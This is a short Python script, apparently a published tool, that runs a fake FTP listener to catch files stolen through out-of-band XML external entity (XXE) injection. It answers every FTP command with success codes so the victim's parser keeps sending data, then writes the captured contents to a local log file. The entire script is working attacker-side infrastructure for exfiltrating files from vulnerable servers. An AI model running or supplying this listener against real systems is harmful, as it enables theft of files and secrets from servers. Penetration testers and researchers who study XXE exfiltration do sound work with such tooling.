#!/usr/bin/env python3
import socket
import sys
import argparse

parser = argparse.ArgumentParser(description='An Out-of-Band XXE tool by Corben Leo')
parser.add_argument('port',type=int,help="Port for the FTP server to listen on (2121 / 21)")
args = parser.parse_args()

HOST = ''
PORT = args.port

welcome = b'220 oob-xxe\n'
ftp_catch_all_response = b'230 more data please!\n'
ftp_user_response = b'331 hello world!\n'
ftp_pass_response = b'230 my password is also hunter2!\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def main():
    try:
        s.bind((HOST, PORT))
    except socket.error as msg:
        print('[+] ERROR: Bind failed. ')
        sys.exit()

    s.listen(10)
    print('[+] 230OOB started on port: '+str(PORT))


    conn, addr = s.accept()
    print('[*] Connection from: '+addr[0]+"!")
    conn.sendall(welcome)

    while True:
        data = conn.recv(1024)
        ftp_command = data.split(b" ", 1)
        response = {
            'user': ftp_user_response,
            'pass': ftp_pass_response,
        }.get(ftp_command[0].lower(), ftp_catch_all_response)
        conn.sendall(response)
        line = data.decode('UTF-8')
        line = line.replace("\n","").replace("CWD","")
        print(line)
        extract(line)
    s.close()

def extract(data):
        fopen = open('./extracted.log', 'a')
        fopen.write(data)
        fopen.close()

try:
    main()
except KeyboardInterrupt:
    s.close()